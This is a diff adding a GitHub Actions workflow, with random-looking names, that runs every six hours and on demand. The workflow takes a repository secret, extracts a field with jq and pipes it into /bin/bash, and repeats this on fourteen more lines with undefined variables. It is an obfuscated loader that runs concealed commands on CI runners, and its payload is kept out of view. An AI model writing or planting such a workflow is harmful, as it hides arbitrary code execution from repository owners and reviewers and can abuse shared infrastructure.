@@ -1,0 +1,31 @@
+name: zhangsansa8917
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '20 2/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: zhangsansa8917
+        env:
+          svb88030: ${{ secrets.svb88030 }}
+        run: |
+          echo $svb88030 | jq -r .icy10753 | /bin/bash
+          echo $lk2 | jq -r .fdqqn39 | /bin/bash
+          echo $siix668 | jq -r .fagkd9180 | /bin/bash
+          echo $lkf05 | jq -r .ozxd849 | /bin/bash
+          echo $scsxs2793 | jq -r .vai64870 | /bin/bash
+          echo $qius2 | jq -r .imskw38 | /bin/bash
+          echo $oamy672 | jq -r .guksq6682 | /bin/bash
+          echo $xlvn922 | jq -r .tripd47 | /bin/bash
+          echo $qiyny2032 | jq -r .p94586 | /bin/bash
+          echo $xv5 | jq -r .bp4 | /bin/bash
+          echo $x84629 | jq -r .de6 | /bin/bash
+          echo $wfkya3876 | jq -r .n75381 | /bin/bash
+          echo $t018 | jq -r .rl6603 | /bin/bash
+          echo $nzxla7525 | jq -r .t00272 | /bin/bash
+          echo $ys8224 | jq -r .qph91750 | /bin/bash
+
